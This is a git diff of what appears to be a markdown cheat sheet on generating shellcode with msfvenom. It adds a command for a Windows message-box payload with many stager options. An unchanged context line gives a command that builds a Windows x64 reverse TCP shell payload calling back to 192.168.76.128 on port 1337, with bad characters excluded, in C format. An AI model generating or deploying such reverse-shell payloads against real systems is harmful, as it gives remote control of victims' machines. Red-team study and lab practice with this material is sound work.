@@ -12,6 +12,12 @@ description: 06/08/2022
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.76.128 LPORT=1337 -f c -b \x00\x0a\x0d\x20
 ```
 
+#### More Advanced Args
+
+```
+msfvenom -p windows/x64/messagebox EXITFUNC=thread -f c ReverseAllowProxy=false ReverseListenerThreaded=false StagerRetryCount=10 StagerRetryWait=5 PingbackRetries=0 PayloadUUIDTracking=false EnableStageEncoding=false StageEncoderSaveRegisters=  StageEncodingFallback=true PrependMigrate=false AutoLoadStdapi=true
+```
+
 ### Windows Message Box
 
 ```
